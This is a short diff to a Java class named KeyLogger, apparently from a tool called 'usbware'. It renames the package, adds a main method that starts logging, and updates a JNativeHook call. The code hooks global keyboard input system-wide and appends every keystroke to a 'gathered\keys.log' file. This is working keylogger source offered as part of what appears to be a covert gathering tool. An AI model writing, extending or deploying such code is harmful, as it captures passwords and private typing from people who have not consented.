@@ -1,4 +1,4 @@
-package thatcherdev.usbware.backend;
+package com.github.thatcherdev.usbware.backend;
 
 import java.io.BufferedWriter;
 import java.io.FileWriter;
@@ -12,6 +12,11 @@ public class KeyLogger implements NativeKeyListener {
 	private static PrintWriter out;
 	private boolean shift=false;
 
+	public static void main(String[] args) {
+		System.out.println("Starting");
+		start();
+	}
+
 	/**
 	 * Starts a key logger and logs keys to 'gathered\keys.log'.
 	 */
@@ -19,7 +24,7 @@ public class KeyLogger implements NativeKeyListener {
 		try{
 			out=new PrintWriter(new BufferedWriter(new FileWriter("gathered\\keys.log", true)));
 			GlobalScreen.registerNativeHook();
-			GlobalScreen.getInstance().addNativeKeyListener(new KeyLogger());
+			GlobalScreen.addNativeKeyListener(new KeyLogger());
 		}catch(Exception e){
 			if(out!=null)
 				out.close();
